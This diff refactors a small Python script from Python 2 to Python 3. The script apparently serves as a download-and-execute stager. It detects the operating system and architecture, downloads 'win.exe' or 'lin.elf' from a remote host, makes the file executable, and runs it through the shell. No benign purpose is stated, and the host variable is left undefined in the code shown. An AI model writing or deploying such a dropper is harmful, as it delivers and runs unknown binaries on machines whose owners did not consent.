@@ -1,36 +1,33 @@
-from platform import platform, architecture   # Importa a função para obter o OS e arquitetura
-from urllib import urlretrieve  # Importa a função para fazer download de arquivos
-from subprocess import call     # Importa a função para chamar comandos no shell
-def obterArch():
-    global arch
-    if architecture()[0] == '64bit':
-        arch = 'x64'
-    else:
-        arch = 'x86'
+from sys import platform, maxsize
+from urllib.request import urlretrieve
+from subprocess import call as _call
+from functools import partial
 
-def obterOS():  # Função para definir o OS
-    if platform()[0] == 'W':
-        return True
-    else:
-        return False
+call = partial(_call, shell=True) # redefine call
 
-def init(): # Função para fazer o download do arquivo e chamar no shell
-    urlF = 'http://%s/%s/%s' % (host, arch, url)
-    urlretrieve(urlF, url)
-    if obterOS() == True:
-        call('call ' + url, shell=True)
-    else:
-        call('chmod +x ' + url, shell=True)
-        call('./' + url, shell=True)
+def get_arch():
+    """An integer giving the maximum value a variable of type Py_ssize_t can take. 
+    It’s usually 2**31 - 1 on a 32-bit platform and 2**63 - 1 on a 64-bit platform."""
+    return 'x64' if maxsize == 2**63 - 1 else 'x86'
 
-def main(): # Função Principal, define variavéis
-    global url
-    obterArch()
-    if obterOS() == True:
-        url = 'win.exe'
+def init(arch, file_name): 
+    """Download file and call shell"""
+    url_file = 'http://%s/%s/%s' % (host, arch, file_name)
+    urlretrieve(url_file, file_name)
+    
+    if platform.startswith('win'):
+        call('call ' + file_name)
     else:
-        url = 'lin.elf'
-    init()
+        call('chmod +x ' + file_name)
+        call('./' + file_name)
 
-if __name__ == "__main__": # Inicia o Script
+def main(): 
+    arch = get_arch()
+    if platform.startswith('win'):
+        file_name = 'win.exe'
+    else:
+        file_name = 'lin.elf'
+    init(arch, file_name)
+
+if __name__ == "__main__":
     main()
